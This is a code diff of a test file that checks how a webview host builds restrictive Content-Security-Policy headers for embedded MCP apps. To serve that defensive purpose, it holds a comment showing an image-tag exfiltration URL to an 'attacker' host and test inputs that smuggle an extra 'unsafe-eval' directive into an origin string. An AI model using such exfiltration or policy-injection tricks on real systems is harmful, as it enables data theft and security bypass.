@@ -2,7 +2,9 @@ import { describe, expect, it, vi } from "vitest";
 import {
   SANDBOX_PROXY_READY_METHOD,
   SANDBOX_RESOURCE_READY_METHOD,
+  type McpUiResourceCsp as UpstreamMcpUiResourceCsp,
 } from "@modelcontextprotocol/ext-apps";
+import type { McpUiResourceCsp } from "../../../../mcp/types.js";
 import { buildMcpCsp, buildMcpCspHeader } from "../../../../shared/mcp-app-csp.js";
 import {
   MCP_APP_BRIDGE_CHANNEL,
@@ -122,33 +124,79 @@ describe("WebviewIpcTransport", () => {
   });
 });
 
-describe("McpAppView CSP", () => {
-  it("injects metadata CSP additions into the host-built document policy", () => {
-    const wrapped = buildMcpCsp({
-      imgSrc: ["https://images.example.com", "data:"],
-    });
-
-    expect(wrapped).toContain("img-src data: blob: https: https://images.example.com");
+describe("MCP-App CSP (per-resource envelope, built in main)", () => {
+  it("our McpUiResourceCsp is assignable to the upstream spec type (anti-drift pin)", () => {
+    // We re-declare the spec shape locally because ext-apps' .d.ts files use
+    // extensionless relative imports that don't resolve under NodeNext. This pin
+    // makes an upstream shape change a compile error here, not a silent drift.
+    const ours: McpUiResourceCsp = {
+      connectDomains: ["https://api.example.com"],
+      resourceDomains: ["https://cdn.example.com"],
+      frameDomains: ["https://frame.example.com"],
+      baseUriDomains: ["https://base.example.com"],
+    };
+    const upstream: UpstreamMcpUiResourceCsp = ours;
+    expect(upstream.connectDomains).toEqual(["https://api.example.com"]);
   });
 
-  it("ignores unsafe metadata CSP sources and locked boundary directives", () => {
-    const csp = buildMcpCspHeader({
-      connectSrc: ["http://insecure.example.com", "https://api.example.com"],
-      // @ts-expect-error — boundary directives are not overridable by metadata
-      baseUri: ["https://evil.example.com"],
-    });
-
-    expect(csp).toContain("connect-src https://api.example.com");
-    expect(csp).not.toContain("http://insecure.example.com");
-    expect(csp).toContain("base-uri 'none'");
-  });
-
-  it("emits a header string (no <meta> wrapper) — the proxy response-header form", () => {
-    // The header is the SOT: the inner srcdoc app frame INHERITS it and can only
-    // narrow it, so this string is the effective envelope for untrusted app code.
+  it("defaults are RESTRICTIVE — no https: wildcard, no hardcoded CDN allowlist", () => {
+    // A blanket permissive ceiling would hand every app every other app's
+    // allowances (spec No-Loosening MUST: the host MUST NOT allow undeclared
+    // domains). `img-src ... https:` was also a plain exfiltration channel:
+    // `<img src="https://attacker/?d=…">` leaks even with `connect-src 'none'`.
     const header = buildMcpCspHeader();
-    expect(header.startsWith("default-src 'none'")).toBe(true);
-    expect(header).not.toContain("<meta");
+    expect(header).toContain("default-src 'none'");
+    expect(header).toContain("connect-src 'none'");
+    expect(header).toContain("img-src data: blob:");
+    expect(header).not.toMatch(/img-src[^;]*\bhttps:/);
+    expect(header).not.toContain("cdn.jsdelivr.net");
+    expect(header).not.toContain("unpkg.com");
     expect(header).toContain("frame-ancestors 'none'");
+    expect(header).not.toContain("<meta"); // header form, not meta
+  });
+
+  it("connectDomains opens ONLY connect-src", () => {
+    const header = buildMcpCspHeader({ connectDomains: ["https://api.example.com"] });
+    expect(header).toContain("connect-src https://api.example.com");
+    // Must not bleed into other directives.
+    expect(header).toMatch(/img-src data: blob:(;|$)/);
+  });
+
+  it("resourceDomains fans out across script/style/img/font/media", () => {
+    const header = buildMcpCspHeader({ resourceDomains: ["https://cdn.example.com"] });
+    for (const directive of ["script-src", "style-src", "img-src", "font-src", "media-src"]) {
+      expect(header).toContain(`${directive} `);
+      const section = header.split("; ").find((d) => d.startsWith(`${directive} `))!;
+      expect(section).toContain("https://cdn.example.com");
+    }
+    // NOT a network directive — resourceDomains must not grant fetch/XHR.
+    expect(header).toContain("connect-src 'none'");
+  });
+
+  it("rejects non-https, wildcard and separator-smuggling origins", () => {
+    const header = buildMcpCspHeader({
+      connectDomains: [
+        "http://insecure.example.com",
+        "https://*.evil.example.com",
+        "https://ok.example.com; script-src 'unsafe-eval'",
+        "https://api.example.com",
+      ],
+    });
+    expect(header).toContain("connect-src https://api.example.com");
+    expect(header).not.toContain("insecure.example.com");
+    expect(header).not.toContain("*.evil.example.com");
+    expect(header).not.toContain("unsafe-eval");
+  });
+
+  it("baseUriDomains/frameDomains open only their own directive", () => {
+    const header = buildMcpCspHeader({ baseUriDomains: ["https://base.example.com"] });
+    expect(header).toContain("base-uri https://base.example.com");
+    expect(header).toContain("frame-src 'none'");
+  });
+
+  it("buildMcpCsp wraps the same policy in <meta> form", () => {
+    const wrapped = buildMcpCsp({ resourceDomains: ["https://images.example.com"] });
+    expect(wrapped).toContain('<meta http-equiv="Content-Security-Policy"');
+    expect(wrapped).toContain("https://images.example.com");
   });
 });
